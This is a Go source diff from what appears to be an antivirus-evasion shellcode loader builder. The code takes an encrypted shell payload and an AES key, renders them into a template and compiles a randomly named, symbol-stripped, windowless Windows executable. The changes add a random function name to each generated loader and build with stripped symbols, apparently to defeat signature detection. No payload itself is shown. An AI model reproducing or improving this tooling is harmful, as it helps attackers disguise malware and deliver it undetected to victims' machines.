@@ -25,8 +25,7 @@ func Tpl_go(enshell ,key string, keymode int,s string) string {
 	Filename := randomStr + ".exe"
 	time.Sleep(2)
 
-	//a:="go build -ldflags=\"-w -s -H=windowsgui\" -o "+"./bin/"+Filename+" \"+sname+\".go\""
-	cmd:=exec.Command("cmd", "/c", "go build -ldflags=-H=windowsgui --trimpath -o "+"./bin/"+Filename+" "+sname+".go")
+	cmd:=exec.Command("cmd", "/c","go", "build", "-ldflags", "-w -s -H=windowsgui","--trimpath","-o","./bin/"+Filename,sname+".go")
 	err := cmd.Run()
 	if err != nil {
 		panic(err)
@@ -38,12 +37,14 @@ func Tpl_go(enshell ,key string, keymode int,s string) string {
 func tpl(tshell, key,tplname string,Kmode int) {
 	smode :=fmt.Sprintf("%d", Kmode)
 	skey :=hex.EncodeToString([]byte(key))
+	funcnames:=CreateRandomString(6)
 	type Inventory struct {
 		Exshell string
 		AesKey	string
 		Keymode string
+		Func string
 	}
-	Texts := Inventory{tshell,skey,smode}
+	Texts := Inventory{tshell,skey,smode,funcnames}
 	gname := movfile(tplname)
 	tmpl, err := template.ParseFiles(tplname)
 	file, err := os.OpenFile(gname, os.O_CREATE|os.O_WRONLY, 0755)
@@ -61,7 +62,7 @@ func CheckErr(err error) {
 //随机字符串
 func CreateRandomString(len int) string {
 	var container string
-	var str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
+	var str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 	b := bytes.NewBufferString(str)
 	length := b.Len()
 	bigInt := big.NewInt(int64(length))
